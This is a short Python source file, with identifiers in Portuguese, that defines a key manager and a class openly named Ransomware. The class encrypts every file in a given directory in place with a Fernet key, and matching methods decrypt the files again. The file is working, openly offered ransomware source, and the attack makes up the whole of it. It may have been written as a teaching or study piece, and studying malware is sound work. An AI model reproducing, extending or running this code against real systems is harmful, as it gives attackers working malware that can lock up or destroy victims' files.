import os

from cryptography.fernet import Fernet

from arquivos_utils import escrever_arquivo, ler_arquivo


class GerenciadorDeChave:
    def __init__(self, caminho_para_chave):
        self.caminho_para_chave = caminho_para_chave

    def crie_chave(self):
        if os.path.exists(self.caminho_para_chave):
            return self.obtenha_chave()

        chave_criptografia = Fernet.generate_key()
        escrever_arquivo(self.caminho_para_chave, chave_criptografia)
        return chave_criptografia

    def obtenha_chave(self, legivel=False):
        chave = ler_arquivo(self.caminho_para_chave)

        if legivel:
            return chave.decode('utf-8')

        return chave

    def remova_chave(self):
        os.remove(self.caminho_para_chave)

    @staticmethod
    def converta_para_bytes(chave):
        return chave.encode('utf-8')


class Ransomware:
    def __init__(self, gerenciador_de_chave):
        self.gerenciador_de_chave = gerenciador_de_chave

    def infecte_arquivo(self, caminho_para_arquivo):
        conteudo = ler_arquivo(caminho_para_arquivo)
        conteudo_criptografado = Fernet(self.gerenciador_de_chave.crie_chave()).encrypt(conteudo)
        escrever_arquivo(caminho_para_arquivo, conteudo_criptografado)

    def infecte_diretorio(self, diretorio):
        for nome_arquivo in os.listdir(diretorio):
            caminho_arquivo = f'{diretorio}/{nome_arquivo}'
            self.infecte_arquivo(caminho_arquivo)

    def desinfecte_arquivo(self, caminho_para_arquivo, chave, remover_chave=False):
        conteudo_criptografado = ler_arquivo(caminho_para_arquivo)
        conteudo = Fernet(chave).decrypt(conteudo_criptografado)
        escrever_arquivo(caminho_para_arquivo, conteudo)

        if remover_chave:
            self.gerenciador_de_chave.remova_chave()

    def desinfecte_diretorio(self, diretorio, chave, remover_chave=False):
        for nome_arquivo in os.listdir(diretorio):
            caminho_arquivo = f'{diretorio}/{nome_arquivo}'
            self.desinfecte_arquivo(caminho_arquivo, chave)

        if remover_chave:
            self.gerenciador_de_chave.remova_chave()
